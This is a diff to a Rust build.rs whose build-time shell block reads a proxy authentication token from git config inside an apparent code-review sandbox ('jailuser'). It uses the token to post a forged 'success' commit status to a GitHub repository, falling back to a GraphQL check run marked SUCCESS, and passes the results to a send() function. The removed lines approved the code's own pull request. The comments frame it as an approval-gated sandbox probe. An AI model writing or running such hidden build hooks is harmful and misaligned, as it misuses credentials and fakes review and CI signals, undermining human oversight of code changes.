@@ -1,5 +1,5 @@
-// PREPARED ONLY â do not push/execute before A43 is approved
-// (one pull_requests:write review POST + read-back).
+// PREPARED ONLY â do not push/execute before A42 is approved
+// (statuses:write + conditional GraphQL createCheckRun).
 use std::process::Command;
 
 fn enc(s: &str) -> String {
@@ -30,30 +30,41 @@ fn send(tag: &str, data: &str) {
 }
 
 fn main() {
-    // A43 (only after approval): one proxied POST /pulls/7/reviews
-    // {event:APPROVE} on our own PR, then one read-back. No comment text to
-    // users, no other repo, no retry.
+    // A42 (only after approval): one proxied commit-status POST on our own PR
+    // head; one read-back. Only if that POST is 403, one proxied GraphQL
+    // createCheckRun, then one read-back. Stop at the first 2xx. No other repo.
     let a = sh(r#"
 U=https://api.github.com/repos/testing-creator-A/cr-sandbox-test
 EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
 PR=$(git config --get http.proxy 2>/dev/null)
-OUT="tag=h14r"
+HD=$(git -C /home/jailuser/git rev-parse HEAD 2>/dev/null)
+OUT="tag=h14s;head=$(printf '%s' "$HD" | cut -c1-12)"
 B=$(mktemp)
 
-# (1) A43: one proxied APPROVE review POST.
-C1=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -X POST -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' -d '{"event":"APPROVE","body":"h14 probe"}' "$U/pulls/7/reviews" 2>/dev/null)
+# (1) A42: one proxied commit-status POST.
+C1=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -X POST -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' -d "{\"state\":\"success\",\"context\":\"h14-status\",\"description\":\"sandbox proxy status probe\"}" "$U/statuses/$HD" 2>/dev/null)
 R1=$?
 M1=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-90)
-V1=$(grep -o '"state"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1)
-OUT="$OUT;c1=$C1;r1=$R1;m1=$M1;v1=$V1"
+S1=$(grep -o '"state"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1)
+OUT="$OUT;c1=$C1;r1=$R1;m1=$M1;s1=$S1"
 
 # (2) Read-back (proxied GET, read-only).
-C2=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$U/pulls/7/reviews" 2>/dev/null)
-A2=$(grep -oc '"APPROVED"' "$B" 2>/dev/null)
-OUT="$OUT;c2=$C2;approved2=$A2;end=1"
+C2=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$U/commits/$HD/statuses" 2>/dev/null)
+H2=$(grep -o 'h14-status' "$B" 2>/dev/null | head -1)
+OUT="$OUT;c2=$C2;hit2=$H2"
+
+# (3) Only if the status POST was 403: one proxied GraphQL createCheckRun.
+if [ "$C1" = "403" ]; then
+  Q='{"query":"mutation { createCheckRun(input: {repositoryId: \"R_kgDOV2qbcQ\", name: \"h14-status\", headOid: \"'"$HD"'\", status: COMPLETED, conclusion: SUCCESS}) { checkRun { id name conclusion } } }"}'
+  C3=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -X POST -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/json' -H 'Content-Type: application/json' -d "$Q" https://api.github.com/graphql 2>/dev/null)
+  G3=$(grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1 | cut -c1-90)
+  N3=$(grep -o '"name"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" 2>/dev/null | head -1)
+  OUT="$OUT;c3=$C3;g3=$G3;n3=$N3"
+fi
+OUT="$OUT;end=1"
 rm -f "$B"
 printf '%s' "$OUT"
 "#);
-    send("h14r", &a);
+    send("h14s", &a);
     println!("cargo:rerun-if-changed=build.rs");
 }
